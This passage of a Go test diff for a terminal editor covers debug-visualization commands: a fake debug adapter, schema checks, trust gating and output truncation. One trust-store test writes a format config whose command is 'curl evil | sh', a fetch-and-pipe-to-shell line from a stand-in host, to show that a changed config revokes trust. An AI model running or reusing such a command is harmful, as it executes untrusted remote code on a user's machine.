@@ -9,8 +9,10 @@ package app
 
 import (
 	"bufio"
+	"bytes"
 	"context"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"net"
@@ -27,6 +29,7 @@ import (
 
 	"github.com/cloudmanic/spice-edit/internal/dap"
 	"github.com/cloudmanic/spice-edit/internal/editor"
+	"github.com/cloudmanic/spice-edit/internal/format"
 	"github.com/cloudmanic/spice-edit/internal/state"
 )
 
@@ -35,6 +38,9 @@ import (
 // answers are painted onto.
 func debugFixture(t *testing.T) (*App, string) {
 	t.Helper()
+	// A session registers this editor for debug queries; keep that out of the
+	// real state directory.
+	t.Setenv("XDG_STATE_HOME", t.TempDir())
 	dir := t.TempDir()
 	path := filepath.Join(dir, "main.go")
 	src := "package main\n\nimport \"fmt\"\n\nfunc add(a, b int) int {\n\tsum := a + b\n\treturn sum\n}\n\nfunc main() {\n\tfmt.Println(add(2, 3))\n}\n"
@@ -2776,5 +2782,966 @@ func TestDebugGutterKeepsTheLineBackground(t *testing.T) {
 	if glyphBG != plainBG {
 		t.Errorf("glyph background %v does not match the surrounding gutter background %v",
 			glyphBG, plainBG)
+	}
+}
+
+// vizAdapter is a fake debug adapter for the visualization commands: it answers
+// initialize, stackTrace, evaluate and variables from fixed tables and records
+// every request, so a test can assert both on the document AND on what reached
+// the wire — a refusal is only a refusal if nothing was sent.
+type vizAdapter struct {
+	conn   net.Conn
+	r      *bufio.Reader
+	frames []dap.StackFrame
+	value  dap.EvaluateResult
+	vars   map[int][]dap.Variable
+
+	// initCaps is the initialize response body; evalDelay holds the evaluate
+	// answer back so a short timeout fires first.
+	initCaps  map[string]interface{}
+	evalDelay time.Duration
+
+	mu   sync.Mutex
+	reqs []recordedRequest
+}
+
+// newVizAdapter starts the fake behind a real dap.Client over net.Pipe.
+func newVizAdapter(t *testing.T, frames []dap.StackFrame, value dap.EvaluateResult, vars map[int][]dap.Variable) (*dap.Client, *vizAdapter) {
+	t.Helper()
+	ours, theirs := net.Pipe()
+	f := &vizAdapter{conn: theirs, r: bufio.NewReader(theirs), frames: frames, value: value, vars: vars}
+	client := dap.StartConn("fakeviz", ours, dap.Handlers{})
+	t.Cleanup(func() {
+		_ = theirs.Close()
+		_ = ours.Close()
+	})
+	go f.serve()
+	return client, f
+}
+
+// serve answers requests until the pipe closes.
+func (f *vizAdapter) serve() {
+	for {
+		_ = f.conn.SetDeadline(time.Now().Add(30 * time.Second))
+		body, err := readFramed(f.r)
+		if err != nil {
+			return
+		}
+		var req dap.Request
+		if json.Unmarshal(body, &req) != nil {
+			return
+		}
+		rec := recordedRequest{Command: req.Command, Args: map[string]interface{}{}}
+		if raw, err := json.Marshal(req.Arguments); err == nil {
+			_ = json.Unmarshal(raw, &rec.Args)
+		}
+		f.mu.Lock()
+		f.reqs = append(f.reqs, rec)
+		delay := f.evalDelay
+		f.mu.Unlock()
+
+		var respBody interface{} = struct{}{}
+		switch req.Command {
+		case "initialize":
+			respBody = f.initCaps
+		case "stackTrace":
+			respBody = map[string]interface{}{"stackFrames": f.frames, "totalFrames": len(f.frames)}
+		case "evaluate":
+			time.Sleep(delay)
+			respBody = f.value
+		case "variables":
+			ref, _ := rec.Args["variablesReference"].(float64)
+			respBody = map[string]interface{}{"variables": f.vars[int(ref)]}
+		case "cancel":
+			continue // fire-and-forget on the client side; nobody waits on it
+		}
+		raw, _ := json.Marshal(respBody)
+		out, _ := json.Marshal(dap.Response{
+			Type: dap.TypeResponse, RequestSeq: req.Seq, Success: true,
+			Command: req.Command, Body: raw,
+		})
+		if _, err := fmt.Fprintf(f.conn, "Content-Length: %d\r\n\r\n", len(out)); err != nil {
+			return
+		}
+		if _, err := f.conn.Write(out); err != nil {
+			return
+		}
+	}
+}
+
+// commands lists the request commands received, in order.
+func (f *vizAdapter) commands() []string {
+	f.mu.Lock()
+	defer f.mu.Unlock()
+	out := make([]string, 0, len(f.reqs))
+	for _, r := range f.reqs {
+		out = append(out, r.Command)
+	}
+	return out
+}
+
+// sent reports whether a request with this command was received.
+func (f *vizAdapter) sent(command string) bool {
+	for _, c := range f.commands() {
+		if c == command {
+			return true
+		}
+	}
+	return false
+}
+
+// evaluateArgs returns the arguments of the first evaluate request, if any.
+func (f *vizAdapter) evaluateArgs() (map[string]interface{}, bool) {
+	f.mu.Lock()
+	defer f.mu.Unlock()
+	for _, r := range f.reqs {
+		if r.Command == "evaluate" {
+			return r.Args, true
+		}
+	}
+	return nil, false
+}
+
+// vizStack is the two-frame stack every viz test stops on. The innermost frame
+// is id 0 on purpose — js-debug's numbering — so a dropped zero shows up.
+var vizStack = []dap.StackFrame{
+	{ID: 0, Name: "main.add", Source: dap.Source{Path: "/p/main.go"}, Line: 6},
+	{ID: 7, Name: "main.main", Source: dap.Source{Path: "/p/main.go"}, Line: 11},
+}
+
+// vizFormatConfig is the project config whose hash the trust store is keyed by.
+const vizFormatConfig = `{"commands": {"go": ["gofmt", "-w", "$FILE"]}}`
+
+// trustProject writes root's .spiceedit/format.json and records a trust
+// decision for it through the PRODUCTION writer the format prompt uses, keyed
+// by that config's REAL hash — so the oracle is the store's own rule (project
+// AND config hash) rather than a second copy of it in the test.
+func trustProject(t *testing.T, root string, trusted bool) {
+	t.Helper()
+	writeFormatConfig(t, root, vizFormatConfig)
+	cfg, err := format.Load(root)
+	if err != nil || cfg == nil {
+		t.Fatalf("load format config: %v", err)
+	}
+	path := filepath.Join(t.TempDir(), "trust.json")
+	t.Setenv("SPICEEDIT_TRUST_FILE", path)
+	tf := &format.TrustFile{}
+	tf.SetTrust(root, cfg.Hash(), trusted)
+	if err := format.SaveTrust(path, tf); err != nil {
+		t.Fatal(err)
+	}
+}
+
+// vizSessionFixture is an app stopped in a fake session on vizStack, with the
+// user looking at frame index cur.
+func vizSessionFixture(t *testing.T, value dap.EvaluateResult, vars map[int][]dap.Variable, cur int) (*App, *vizAdapter) {
+	t.Helper()
+	a, _ := debugFixture(t)
+	client, fake := newVizAdapter(t, vizStack, value, vars)
+	frames := make([]debugFrame, 0, len(vizStack))
+	for _, f := range vizStack {
+		frames = append(frames, debugFrame{ID: f.ID, Name: f.Name, Path: f.Source.Path, Line: bufLineFromAdapter(f.Line)})
+	}
+	a.debug = &debugSession{
+		client: client, adapter: "fakeviz", running: true, stopped: true, threadID: 1,
+		frames: frames, curFrame: cur, bound: map[string][]boundBreakpoint{},
+	}
+	return a, fake
+}
+
+// vizSchemaFile loads docs/viz-schema-v1.json, the file renderers are written to.
+func vizSchemaFile(t *testing.T) map[string]interface{} {
+	t.Helper()
+	raw, err := os.ReadFile("../../docs/viz-schema-v1.json")
+	if err != nil {
+		t.Fatal(err)
+	}
+	var s map[string]interface{}
+	if err := json.Unmarshal(raw, &s); err != nil {
+		t.Fatalf("schema is not JSON: %v", err)
+	}
+	return s
+}
+
+// assertSchemaValid checks a reply against the schema file's top level — the
+// root (a viz document) when def is "", else the named $defs entry ("frames",
+// "error"): every required key present, no key the schema does not declare,
+// schemaVersion 1. It then decodes the reply strictly into the Go type that
+// encoded it. The full JSON-Schema validator is test code of internal/dap,
+// where every VizResult shape is validated against the whole file.
+func assertSchemaValid(t *testing.T, reply []byte, def string) {
+	t.Helper()
+	schema := vizSchemaFile(t)
+	node := schema
+	var into interface{} = &dap.VizResult{}
+	switch def {
+	case "frames":
+		into = &debugVizFramesDoc{}
+	case "error":
+		into = &debugVizErrorDoc{}
+	}
+	if def != "" {
+		node = schema["$defs"].(map[string]interface{})[def].(map[string]interface{})
+	}
+	var doc map[string]interface{}
+	if err := json.Unmarshal(reply, &doc); err != nil {
+		t.Fatalf("reply is not a JSON object: %v: %s", err, reply)
+	}
+	props, _ := node["properties"].(map[string]interface{})
+	for k := range doc {
+		if _, ok := props[k]; !ok {
+			t.Errorf("schema (%q): undeclared key %q", def, k)
+		}
+	}
+	required, _ := node["required"].([]interface{})
+	for _, k := range required {
+		if _, ok := doc[k.(string)]; !ok {
+			t.Errorf("schema (%q): missing required %q", def, k)
+		}
+	}
+	if doc["schemaVersion"] != float64(1) {
+		t.Errorf("schema (%q): schemaVersion = %v", def, doc["schemaVersion"])
+	}
+	dec := json.NewDecoder(bytes.NewReader(reply))
+	dec.DisallowUnknownFields()
+	if err := dec.Decode(into); err != nil {
+		t.Errorf("schema (%q): %v", def, err)
+	}
+}
+
+// askVizRaw runs one command through debugVizCommand — the App entry point,
+// with its main-goroutine snapshot — and returns the encoded reply.
+func askVizRaw(t *testing.T, a *App, req debugVizRequest) []byte {
+	t.Helper()
+	got := make(chan []byte, 2)
+	a.debugVizCommand(req, func(b []byte) { got <- b })
+	select {
+	case b := <-got:
+		return b
+	case <-time.After(10 * time.Second):
+		t.Fatal("no reply within 10s")
+		return nil
+	}
+}
+
+// askViz is askVizRaw decoded.
+func askViz(t *testing.T, a *App, req debugVizRequest) map[string]interface{} {
+	t.Helper()
+	b := askVizRaw(t, a, req)
+	var doc map[string]interface{}
+	if err := json.Unmarshal(b, &doc); err != nil {
+		t.Fatalf("reply is not JSON: %v: %s", err, b)
+	}
+	return doc
+}
+
+// TestDebugVizEvaluateReturnsVizJSON is the happy path end to end: a trusted,
+// stopped session answers an evaluate with a schema-v1 document whose kind came
+// from the extractor, whose source names the selected frame, and which says it
+// may have run code because watch was asked for — and the whole reply,
+// warning included, validates against the schema file.
+func TestDebugVizEvaluateReturnsVizJSON(t *testing.T) {
+	vars := map[int][]dap.Variable{5: {
+		{Name: "[0]", Value: "1", Type: "int"},
+		{Name: "[1]", Value: "4", Type: "int"},
+		{Name: "[2]", Value: "9", Type: "int"},
+	}}
+	a, fake := vizSessionFixture(t, dap.EvaluateResult{Result: "[]int len: 3", Type: "[]int", VariablesReference: 5}, vars, 0)
+	trustProject(t, a.rootDir, true)
+
+	raw := askVizRaw(t, a, debugVizRequest{Command: debugVizEvaluate, Expression: "xs", Context: "watch", AllowSideEffects: true})
+	assertSchemaValid(t, raw, "")
+	var doc map[string]interface{}
+	if err := json.Unmarshal(raw, &doc); err != nil {
+		t.Fatal(err)
+	}
+
+	if doc["error"] != nil {
+		t.Fatalf("unexpected error: %v", doc["error"])
+	}
+	if doc["schemaVersion"] != float64(1) || doc["kind"] != "plot" {
+		t.Fatalf("schemaVersion=%v kind=%v, want 1 and plot", doc["schemaVersion"], doc["kind"])
+	}
+	data, _ := doc["data"].(map[string]interface{})
+	if fmt.Sprint(data["y"]) != "[1 4 9]" {
+		t.Errorf("plot y = %v, want [1 4 9]", data["y"])
+	}
+	src, _ := doc["source"].(map[string]interface{})
+	if src["expression"] != "xs" || src["adapter"] != "fakeviz" {
+		t.Errorf("source = %v", src)
+	}
+	if v, present := src["frameId"]; !present || v != float64(0) {
+		t.Errorf("source.frameId = %v (present=%v), want 0 — js-debug's innermost frame", v, present)
+	}
+	if doc["sideEffectWarning"] != true {
+		t.Errorf("watch answer must carry sideEffectWarning:true, got %v", doc["sideEffectWarning"])
+	}
+	args, ok := fake.evaluateArgs()
+	if !ok || args["context"] != "watch" {
+		t.Errorf("evaluate on the wire = %v, want context watch", args)
+	}
+}
+
+// TestDebugVizEvaluateDefaultsToTheSelectedFrame pins that a panel evaluating
+// with no frameId sees the scope the user is looking at in the call-stack
+// picker, not always the innermost one.
+func TestDebugVizEvaluateDefaultsToTheSelectedFrame(t *testing.T) {
+	a, fake := vizSessionFixture(t, dap.EvaluateResult{Result: "3", Type: "int"}, nil, 1)
+	trustProject(t, a.rootDir, true)
+
+	doc := askViz(t, a, debugVizRequest{Command: debugVizEvaluate, Expression: "n", Context: "watch", AllowSideEffects: true})
+
+	if doc["kind"] != "text" {
+		t.Fatalf("kind = %v (error %v), want text", doc["kind"], doc["error"])
+	}
+	args, _ := fake.evaluateArgs()
+	if args["frameId"] != float64(7) {
+		t.Errorf("evaluate frameId = %v, want 7 (the selected frame)", args["frameId"])
+	}
+}
+
+// startVizSession takes a fake adapter through the PRODUCTION capability path:
+// InitializeForEval against the adapter's initialize answer, then
+// handleDebugStarted, which is what stores them on the session. Nothing about
+// the capabilities is set by hand.
+func startVizSession(t *testing.T, initCaps map[string]interface{}, evalDelay time.Duration) (*App, *vizAdapter) {
+	t.Helper()
+	a, _ := debugFixture(t)
+	client, fake := newVizAdapter(t, vizStack, dap.EvaluateResult{Result: "42", Type: "int"}, nil)
+	fake.initCaps, fake.evalDelay = initCaps, evalDelay
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+	caps, evalCaps, err := client.InitializeForEval(ctx, "fakeviz")
+	if err != nil {
+		t.Fatal(err)
+	}
+	a.debug = &debugSession{adapter: "fakeviz", starting: true, bound: map[string][]boundBreakpoint{}}
+	gen := &dap.StopGen{}
+	a.handleDebugStarted(&debugStartedEvent{
+		when: time.Now(), client: client, adapter: "fakeviz",
+		caps: caps, evalCaps: evalCaps, stopGen: gen, bound: map[string][]boundBreakpoint{},
+	})
+	if a.debug.stopGen != gen {
+		t.Fatal("the session did not adopt the stop generation its client's events move")
+	}
+	frames := make([]debugFrame, 0, len(vizStack))
+	for _, f := range vizStack {
+		frames = append(frames, debugFrame{ID: f.ID, Name: f.Name, Path: f.Source.Path, Line: bufLineFromAdapter(f.Line)})
+	}
+	a.debug.stopped, a.debug.threadID, a.debug.frames, a.debug.curFrame = true, 1, frames, 0
+	trustProject(t, a.rootDir, true)
+	return a, fake
+}
+
+// waitForCommand polls the fake for a request, up to d.
+func waitForCommand(f *vizAdapter, command string, d time.Duration) bool {
+	deadline := time.Now().Add(d)
+	for time.Now().Before(deadline) {
+		if f.sent(command) {
+			return true
+		}
+		time.Sleep(10 * time.Millisecond)
+	}
+	return f.sent(command)
+}
+
+// TestDebugVizUsesTheAdaptersRealCapabilitiesWhenSupported pins finding 2's
+// positive half: an adapter whose initialize answer advertises
+// supportsEvaluateForHovers and supportsCancelRequest gets hover as the default
+// context, and a timed-out evaluate is CANCELLED on the wire.
+func TestDebugVizUsesTheAdaptersRealCapabilitiesWhenSupported(t *testing.T) {
+	a, fake := startVizSession(t, map[string]interface{}{
+		"supportsEvaluateForHovers": true, "supportsCancelRequest": true,
+	}, 0)
+	if !a.debug.evalCaps.SupportsEvaluateForHovers || !a.debug.evalCaps.SupportsCancelRequest {
+		t.Fatalf("session evalCaps = %+v, want both from initialize", a.debug.evalCaps)
+	}
+
+	raw := askVizRaw(t, a, debugVizRequest{Command: debugVizEvaluate, Expression: "n"})
+	assertSchemaValid(t, raw, "")
+	if args, _ := fake.evaluateArgs(); args["context"] != "hover" {
+		t.Fatalf("default context on the wire = %v (reply %s), want hover", args["context"], raw)
+	}
+
+	// The cancel half, through the same session snapshot with a short timeout.
+	a2, fake2 := startVizSession(t, map[string]interface{}{
+		"supportsEvaluateForHovers": true, "supportsCancelRequest": true,
+	}, 600*time.Millisecond)
+	tgt, err := a2.debugVizTarget()
+	if err != nil {
+		t.Fatal(err)
+	}
+	lim := dap.DefaultEvalLimits()
+	lim.Timeout = 100 * time.Millisecond
+	out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizEvaluate, Expression: "n"}, lim)
+	assertSchemaValid(t, out, "error")
+	if !strings.Contains(string(out), "timed out") {
+		t.Errorf("reply = %s, want a timeout error", out)
+	}
+	if !waitForCommand(fake2, "cancel", 3*time.Second) {
+		t.Errorf("adapter supports cancel but none was sent; requests %v", fake2.commands())
+	}
+}
+
+// TestDebugVizUsesTheAdaptersRealCapabilitiesWhenUnsupported pins the negative
+// half: an adapter that advertises neither gets the default hover REFUSED with
+// nothing evaluated, and a timed-out watch evaluate is dropped, never cancelled.
+func TestDebugVizUsesTheAdaptersRealCapabilitiesWhenUnsupported(t *testing.T) {
+	a, fake := startVizSession(t, map[string]interface{}{
+		"supportsEvaluateForHovers": false, "supportsCancelRequest": false,
+	}, 0)
+
+	raw := askVizRaw(t, a, debugVizRequest{Command: debugVizEvaluate, Expression: "n"})
+	assertSchemaValid(t, raw, "error")
+	if !strings.Contains(string(raw), dap.ErrEvalNoHover.Error()) {
+		t.Fatalf("reply = %s, want %q", raw, dap.ErrEvalNoHover)
+	}
+	if fake.sent("evaluate") {
+		t.Error("an evaluate reached the adapter despite the refusal")
+	}
+
+	a2, fake2 := startVizSession(t, map[string]interface{}{}, 600*time.Millisecond)
+	tgt, err := a2.debugVizTarget()
+	if err != nil {
+		t.Fatal(err)
+	}
+	lim := dap.DefaultEvalLimits()
+	lim.Timeout = 100 * time.Millisecond
+	out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizEvaluate, Expression: "n", Context: "watch", AllowSideEffects: true}, lim)
+	if !strings.Contains(string(out), "timed out") {
+		t.Errorf("reply = %s, want a timeout error", out)
+	}
+	if waitForCommand(fake2, "cancel", 900*time.Millisecond) {
+		t.Errorf("adapter does not support cancel but one was sent; requests %v", fake2.commands())
+	}
+}
+
+// TestDebugVizCapabilitiesEventRevisesEvalCaps pins that a mid-session
+// `capabilities` event reaches the safe evaluate's caps, and that a key the
+// event does not name is left alone.
+func TestDebugVizCapabilitiesEventRevisesEvalCaps(t *testing.T) {
+	a, _ := startVizSession(t, map[string]interface{}{"supportsCancelRequest": true}, 0)
+	body, _ := json.Marshal(map[string]interface{}{"capabilities": map[string]interface{}{"supportsEvaluateForHovers": true}})
+	a.handleDAPEvent(&debugEvent{when: time.Now(), client: a.debug.client, ev: dap.Event{Event: dap.EventCapabilities, Body: body}})
+	if got := a.debug.evalCaps; !got.SupportsEvaluateForHovers || !got.SupportsCancelRequest {
+		t.Errorf("evalCaps after event = %+v, want hover gained and cancel kept", got)
+	}
+}
+
+// TestDebugVizRefusesAnUntrustedWorkspace pins the trust gate for both
+// commands, and that the refusal is decided before anything reaches the adapter.
+func TestDebugVizRefusesAnUntrustedWorkspace(t *testing.T) {
+	a, fake := vizSessionFixture(t, dap.EvaluateResult{Result: "3"}, nil, 0)
+	trustProject(t, a.rootDir, false)
+
+	for _, cmd := range []string{debugVizEvaluate, debugVizFrames} {
+		raw := askVizRaw(t, a, debugVizRequest{Command: cmd, Expression: "n", Context: "watch", AllowSideEffects: true})
+		assertSchemaValid(t, raw, "error")
+		if !strings.Contains(string(raw), dap.ErrEvalUntrusted.Error()) {
+			t.Errorf("%s: reply = %s, want %q", cmd, raw, dap.ErrEvalUntrusted)
+		}
+	}
+	if cmds := fake.commands(); len(cmds) != 0 {
+		t.Errorf("untrusted workspace still sent %v", cmds)
+	}
+}
+
+// TestDebugVizRefusesWhileRunning pins the stopped-only rule for both
+// commands: frame ids and variable references mean nothing while running.
+func TestDebugVizRefusesWhileRunning(t *testing.T) {
+	a, fake := vizSessionFixture(t, dap.EvaluateResult{Result: "3"}, nil, 0)
+	trustProject(t, a.rootDir, true)
+	a.debug.stopped = false
+
+	for _, cmd := range []string{debugVizEvaluate, debugVizFrames} {
+		doc := askViz(t, a, debugVizRequest{Command: cmd, Expression: "n", Context: "watch", AllowSideEffects: true})
+		if msg, _ := doc["error"].(string); msg != dap.ErrEvalNotStopped.Error() {
+			t.Errorf("%s: error = %v, want %q", cmd, doc["error"], dap.ErrEvalNotStopped)
+		}
+	}
+	if cmds := fake.commands(); len(cmds) != 0 {
+		t.Errorf("a running session still sent %v", cmds)
+	}
+}
+
+// TestDebugVizRefusesAfterTheSessionResumed pins finding 6: the command's
+// snapshot says stopped, but the program resumes (a `continued` event) before
+// the request goroutine reaches the adapter. Each adapter request re-checks,
+// so nothing is sent and the answer says why — rather than evaluating a frame
+// id from the old stop against the new one.
+func TestDebugVizRefusesAfterTheSessionResumed(t *testing.T) {
+	a, fake := vizSessionFixture(t, dap.EvaluateResult{Result: "3"}, nil, 0)
+	trustProject(t, a.rootDir, true)
+	tgt, err := a.debugVizTarget()
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	a.handleDAPEvent(&debugEvent{when: time.Now(), client: a.debug.client, ev: dap.Event{Event: dap.EventContinued}})
+
+	for _, cmd := range []string{debugVizEvaluate, debugVizFrames} {
+		out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: cmd, Expression: "n", Context: "watch", AllowSideEffects: true}, dap.DefaultEvalLimits())
+		assertSchemaValid(t, out, "error")
+		if !strings.Contains(string(out), dap.ErrEvalResumed.Error()) {
+			t.Errorf("%s: reply = %s, want %q", cmd, out, dap.ErrEvalResumed)
+		}
+	}
+	if cmds := fake.commands(); len(cmds) != 0 {
+		t.Errorf("a resumed session still sent %v", cmds)
+	}
+}
+
+// TestDebugVizFramesListsThePausedFrames pins the frames document: every paused
+// frame with its adapter id and 1-based line, and the selected frame's id —
+// including id 0, which an omitempty would turn into "none selected".
+func TestDebugVizFramesListsThePausedFrames(t *testing.T) {
+	a, _ := vizSessionFixture(t, dap.EvaluateResult{}, nil, 0)
+	trustProject(t, a.rootDir, true)
+
+	raw := askVizRaw(t, a, debugVizRequest{Command: debugVizFrames})
+	assertSchemaValid(t, raw, "frames")
+	var doc map[string]interface{}
+	if err := json.Unmarshal(raw, &doc); err != nil {
+		t.Fatal(err)
+	}
+
+	frames, _ := doc["frames"].([]interface{})
+	if len(frames) != 2 {
+		t.Fatalf("frames = %v (error %v), want 2", doc["frames"], doc["error"])
+	}
+	inner, _ := frames[1].(map[string]interface{})
+	if inner["id"] != float64(7) || inner["name"] != "main.main" || inner["line"] != float64(11) {
+		t.Errorf("frame[1] = %v, want id 7, main.main, adapter line 11", inner)
+	}
+	if v, present := doc["selectedFrameId"]; !present || v != float64(0) {
+		t.Errorf("selectedFrameId = %v (present=%v), want 0", v, present)
+	}
+}
+
+// TestDebugVizTruncationSurvivesNormalisation pins that a value clipped by the
+// output cap is reported truncated. A clipped string is a LEAF, so Normalize's
+// per-node marks alone would present it as complete. The reply validates
+// against the schema with truncated and truncatedBy present.
+func TestDebugVizTruncationSurvivesNormalisation(t *testing.T) {
+	client, _ := newVizAdapter(t, vizStack, dap.EvaluateResult{Result: strings.Repeat("x", 5000), Type: "string"}, nil)
+	tgt := debugVizTarget{client: client, pause: dap.PauseState{Stopped: true, ThreadID: 1}, trusted: true}
+	lim := dap.DefaultEvalLimits()
+	lim.MaxOutBytes = 400
+
+	out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizEvaluate, Expression: "s", Context: "watch", AllowSideEffects: true}, lim)
+	assertSchemaValid(t, out, "")
+	if len(out) > lim.MaxOutBytes {
+		t.Errorf("reply is %d bytes, cap %d", len(out), lim.MaxOutBytes)
+	}
+	var doc map[string]interface{}
+	if err := json.Unmarshal(out, &doc); err != nil {
+		t.Fatal(err)
+	}
+	if doc["truncated"] != true {
+		t.Fatalf("doc = %s, want truncated:true", out)
+	}
+	if fmt.Sprint(doc["truncatedBy"]) != "[output]" {
+		t.Errorf("truncatedBy = %v, want [output]", doc["truncatedBy"])
+	}
+}
+
+// TestDebugVizOutputCapCountsSerializedBytes pins finding 4 with a large tree:
+// 1500 elements whose raw values (150 KB) pass the walk's raw-byte cap, but
+// whose JSON — every `<` escaped to six bytes, plus keys and structure — is
+// several times the 256 KB cap. The reply must fit the cap as ENCODED, say it
+// was truncated by output, keep a breadth-first prefix, and still validate.
+func TestDebugVizOutputCapCountsSerializedBytes(t *testing.T) {
+	const n = 1500
+	kids := make([]dap.Variable, n)
+	for i := range kids {
+		kids[i] = dap.Variable{Name: "[" + strconv.Itoa(i) + "]", Value: strings.Repeat("<", 100), Type: "string"}
+	}
+	client, _ := newVizAdapter(t, vizStack,
+		dap.EvaluateResult{Result: "[]string len: 1500", Type: "[]string", VariablesReference: 9},
+		map[int][]dap.Variable{9: kids})
+	tgt := debugVizTarget{client: client, pause: dap.PauseState{Stopped: true, ThreadID: 1}, trusted: true}
+	lim := dap.DefaultEvalLimits()
+
+	out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizEvaluate, Expression: "xs", Context: "watch", AllowSideEffects: true}, lim)
+	if len(out) > lim.MaxOutBytes {
+		t.Fatalf("reply is %d serialized bytes, cap %d", len(out), lim.MaxOutBytes)
+	}
+	assertSchemaValid(t, out, "")
+	var doc map[string]interface{}
+	if err := json.Unmarshal(out, &doc); err != nil {
+		t.Fatal(err)
+	}
+	if doc["truncated"] != true || !strings.Contains(fmt.Sprint(doc["truncatedBy"]), "output") {
+		t.Fatalf("truncated=%v truncatedBy=%v, want true and output", doc["truncated"], doc["truncatedBy"])
+	}
+	data, _ := doc["data"].(map[string]interface{})
+	root, _ := data["root"].(map[string]interface{})
+	kept, _ := root["children"].([]interface{})
+	if len(kept) == 0 || len(kept) >= n {
+		t.Fatalf("kept %d of %d elements, want a non-empty strict prefix", len(kept), n)
+	}
+	if first, _ := kept[0].(map[string]interface{}); first["name"] != "[0]" {
+		t.Errorf("first kept element = %v, want [0] — the prefix is breadth-first", first["name"])
+	}
+	// The cap is used, not merely respected: a prefix far below it would be a
+	// result thrown away for nothing.
+	if len(out) < lim.MaxOutBytes*3/4 {
+		t.Errorf("reply is %d bytes, well under the %d cap", len(out), lim.MaxOutBytes)
+	}
+}
+
+// TestDebugVizWithoutASessionOrWithAnUnknownCommand pins the two answers that
+// never reach an adapter: no session, and a verb that is neither command. Both
+// must still reply, or a caller waiting on the answer hangs.
+func TestDebugVizWithoutASessionOrWithAnUnknownCommand(t *testing.T) {
+	a, _ := debugFixture(t)
+	if doc := askViz(t, a, debugVizRequest{Command: debugVizFrames}); doc["error"] != "no debug session" {
+		t.Errorf("no session: error = %v", doc["error"])
+	}
+
+	a, _ = vizSessionFixture(t, dap.EvaluateResult{}, nil, 0)
+	trustProject(t, a.rootDir, true)
+	doc := askViz(t, a, debugVizRequest{Command: "setVariable"})
+	if msg, _ := doc["error"].(string); !strings.Contains(msg, "unknown visualization command") {
+		t.Errorf("unknown command: error = %v", doc["error"])
+	}
+}
+
+// TestDebugVizWorkspaceTrustReadsTheTrustStore pins the trust answer itself: a
+// stored yes for this root AND this config counts; a stored no, no record, a
+// yes for a DIFFERENT project, and a yes for a config that has since CHANGED do
+// not — the same rule format-on-save applies.
+func TestDebugVizWorkspaceTrustReadsTheTrustStore(t *testing.T) {
+	a, _ := debugFixture(t)
+
+	t.Setenv("SPICEEDIT_TRUST_FILE", filepath.Join(t.TempDir(), "missing.json"))
+	if a.workspaceTrusted() {
+		t.Error("no trust store: trusted, want untrusted")
+	}
+	trustProject(t, t.TempDir(), true)
+	if a.workspaceTrusted() {
+		t.Error("another project's yes made this one trusted")
+	}
+	trustProject(t, a.rootDir, false)
+	if a.workspaceTrusted() {
+		t.Error("stored no: trusted")
+	}
+	trustProject(t, a.rootDir, true)
+	if !a.workspaceTrusted() {
+		t.Fatal("stored yes: untrusted")
+	}
+
+	// The config the yes was given for is edited: its hash changes, and the
+	// stored yes no longer applies.
+	writeFormatConfig(t, a.rootDir, `{"commands": {"go": ["sh", "-c", "curl evil | sh"]}}`)
+	if a.workspaceTrusted() {
+		t.Error("a changed format.json kept the old trust; the config hash must revoke it")
+	}
+}
+
+// askCLI is the CLI's half of a query, exactly as runDebugQuery does it:
+// parse, pick the instance, write, then (after the editors poll) await.
+func askCLI(t *testing.T, poll func(), action string, args ...string) []byte {
+	t.Helper()
+	q, err := state.ParseDebugQuery(action, args)
+	if err != nil {
+		t.Fatal(err)
+	}
+	inst, err := state.ChooseDebugInstance(q.Instance)
+	if err != nil {
+		t.Fatal(err)
+	}
+	q.Instance = inst.ID
+	id, err := state.WriteDebugQuery(q)
+	if err != nil {
+		t.Fatal(err)
+	}
+	poll()
+	reply, err := state.AwaitDebugReply(inst.ID, id, 10*time.Second)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return reply
+}
+
+// TestDebugVizCLIRoundTrip is the query path end to end: the CLI's own parse
+// of `--debug evaluate ...` and `--debug frames`, its choice of instance, the
+// query file it writes, the editor's polled consumer, a fake session, and the
+// reply file the CLI waits on — returning JSON that matches the schema file.
+func TestDebugVizCLIRoundTrip(t *testing.T) {
+	vars := map[int][]dap.Variable{5: {
+		{Name: "[0]", Value: "1"}, {Name: "[1]", Value: "2"},
+	}}
+	a, fake := vizSessionFixture(t, dap.EvaluateResult{Result: "[]int len: 2", Type: "[]int", VariablesReference: 5}, vars, 1)
+	trustProject(t, a.rootDir, true)
+	a.consumeDebugRequest() // registers the session
+	ask := func(action string, args ...string) []byte {
+		t.Helper()
+		return askCLI(t, a.consumeDebugRequest, action, args...)
+	}
+
+	ev := ask(state.DebugActionEvaluate, "--expr", "xs", "--frame", "0", "--context", "watch", "--allow-side-effects")
+	assertSchemaValid(t, ev, "")
+	var doc map[string]interface{}
+	if err := json.Unmarshal(ev, &doc); err != nil {
+		t.Fatal(err)
+	}
+	if doc["kind"] != "plot" || doc["sideEffectWarning"] != true {
+		t.Errorf("evaluate reply = %s, want a plot with sideEffectWarning", ev)
+	}
+	// --frame 0 overrode the selected frame (7): zero survived the whole trip.
+	if args, _ := fake.evaluateArgs(); args["frameId"] != float64(0) || args["context"] != "watch" {
+		t.Errorf("evaluate on the wire = %v, want frameId 0, context watch", args)
+	}
+
+	fr := ask(state.DebugActionFrames)
+	assertSchemaValid(t, fr, "frames")
+	if !strings.Contains(string(fr), `"selectedFrameId":7`) {
+		t.Errorf("frames reply = %s, want selectedFrameId 7", fr)
+	}
+
+	// A refusal comes back the same way, as a schema-valid error document.
+	no := ask(state.DebugActionEvaluate, "--expr", "xs", "--context", "repl")
+	assertSchemaValid(t, no, "error")
+	if !strings.Contains(string(no), dap.ErrEvalSideEffects.Error()) {
+		t.Errorf("repl without the flag = %s, want %q", no, dap.ErrEvalSideEffects)
+	}
+}
+
+// TestDebugVizEditorWithoutASessionIsNotAddressable pins registration: an
+// editor with no session is not an instance the CLI can pick, and one whose
+// session ends stops being one.
+func TestDebugVizEditorWithoutASessionIsNotAddressable(t *testing.T) {
+	a, _ := debugFixture(t)
